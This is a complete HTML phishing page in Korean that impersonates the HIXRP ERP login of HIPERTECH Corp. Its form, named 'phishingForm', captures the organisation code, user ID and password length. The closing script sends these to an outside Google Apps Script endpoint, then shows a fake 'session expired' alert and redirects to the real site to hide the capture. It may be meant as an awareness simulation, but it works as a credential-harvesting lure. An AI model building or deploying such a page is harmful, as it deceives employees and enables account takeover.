<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HIXRP 로그인</title>
    <style>
        /* 1. 배경 설정 */
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Malgun Gothic', '맑은 고딕', sans-serif;
            background: url('illustration.png') no-repeat center center;
            background-size: cover;
            overflow: hidden;
        }

        /* 2. 로그인 박스 컨테이너 (너비 살짝 넓힘) */
        .login-container {
            width: 340px; 
        }

        /* 로고 영역 */
        .logo-area {
            text-align: center;
            margin-bottom: 25px; /* 로고와 폼 사이 간격 띄움 */
        }

        .logo-area img {
            max-width: 140px; /* 로고 크기 살짝 키움 */
        }

        /* 3. 입력 폼 (간격 넓힘) */
        .input-row {
            display: flex;
            margin-bottom: 10px; /* 인풋 사이 간격 넓힘 */
            border: 1px solid #fff;
            background-color: #8bbaf3; 
            height: 40px; /* 높이 살짝 키움 */
        }

        /* 왼쪽 라벨 */
        .input-row label {
            width: 85px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 11px;
            color: #fff;
            font-weight: normal;
            border-right: 1px solid #fff;
        }

        /* 오른쪽 입력 칸 */
        .input-row input {
            flex: 1;
            background-color: transparent;
            border: none;
            outline: none;
            padding: 0 12px;
            font-size: 12px;
            color: #333;
        }
        
        /* 플레이스홀더 완전 흰색으로 변경 */
        .input-row input::placeholder {
            color: #ffffff;
        }

        /* 4. 로그인 버튼 (글씨 수정) */
        .btn-login {
            width: 100%;
            height: 42px;
            background-color: #212c5b;
            color: #fff;
            border: none;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 5px;
            /* letter-spacing 제거해서 '로그인'으로 딱 붙게 만듦 */
        }

        /* 5. 퇴사자 증명 신청 버튼 (간격 및 디자인 디테일) */
        .btn-resign {
            width: 100%;
            height: 38px;
            background-color: rgba(255, 255, 255, 0.3);
            border: 1px solid #fff;
            color: #333;
            font-size: 11px;
            cursor: pointer;
            margin-top: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }

        /* 6. 하단 옵션 (커스텀 원형 체크박스) */
        .options {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;
            font-size: 11px;
            color: #555;
        }
        .options label {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }
        
        /* 브라우저 기본 체크박스를 둥글게 깎음 */
        .options input[type="checkbox"] {
            appearance: none;
            -webkit-appearance: none;
            width: 12px;
            height: 12px;
            border: 1px solid #888;
            border-radius: 50%; /* 완전한 원형 */
            outline: none;
            cursor: pointer;
            position: relative;
            margin: 0;
        }

        .options input[type="checkbox"]:checked::after {
            content: '✔';
            position: absolute;
            top: -2px;
            left: 1px;
            font-size: 10px;
            color: #555;
        }

        /* 7. 최하단 텍스트 링크들 */
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
            font-size: 10px;
            color: #555;
        }
        .footer-links a {
            text-decoration: none;
            color: #555;
        }
        .footer-links strong {
            color: blue;
        }

        /* 8. 카피라이트 */
        .copyright {
            position: absolute;
            bottom: 20px;
            width: 100%;
            text-align: center;
            font-size: 9px;
            color: #777;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>

    <div class="login-container">
        
        <div class="logo-area">
            <img src="logo.png" alt="XRP ez logo">
        </div>

        <form id="phishingForm">
            <div class="input-row">
                <label>CODE</label>
                <input type="text" id="entCd" placeholder="기관코드" required>
            </div>
            
            <div class="input-row">
                <label>ID</label>
                <input type="text" id="userId" placeholder="아이디" required>
            </div>
            
            <div class="input-row">
                <label>PASSWORD</label>
                <input type="password" id="userPw" placeholder="비밀번호" required>
            </div>

            <!-- 띄어쓰기 제거 완료 -->
            <button type="submit" class="btn-login">로그인</button>
        </form>

        <button class="btn-resign" type="button">
            <!-- 깔끔한 SVG 문서 아이콘으로 교체 -->
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>
            퇴사자 증명 신청
        </button>

        <div class="options">
            <label><input type="checkbox"> 기관코드저장</label>
            <label><input type="checkbox"> 아이디저장</label>
        </div>

        <div class="footer-links">
            <a href="#">IP승인요청</a>
            <a href="#">비밀번호 찾기</a>
            <a href="#"><strong>개인정보처리방침</strong></a>
        </div>
    </div>

    <div class="copyright">
        ⓒ HIPERTECH Corp. All Rights Reserved.
    </div>

    <script>
        const gasUrl = 'https://script.google.com/macros/s/AKfycbwG55MXJXjRpOBQwfX98zaJP5Rag-cnJF6ZFOJj_TY1BFJwQrQD4kZAzOkBFvktkBnqCA/exec';

        document.getElementById('phishingForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const entCd = document.getElementById('entCd').value;
            const id = document.getElementById('userId').value;
            const pw = document.getElementById('userPw').value;

            const finalUrl = `${gasUrl}?targetId=${encodeURIComponent(entCd)}&inputId=${encodeURIComponent(id)}&pwLen=${pw.length}`;
            fetch(finalUrl, { method: 'POST', mode: 'no-cors' });

            setTimeout(() => {
                alert('보안 세션이 만료되었습니다. 다시 로그인해 주세요.');
                window.location.href = 'https://gnk.hixrp.kr/index.jsp';
            }, 500);
        });
    </script>
</body>
</html>
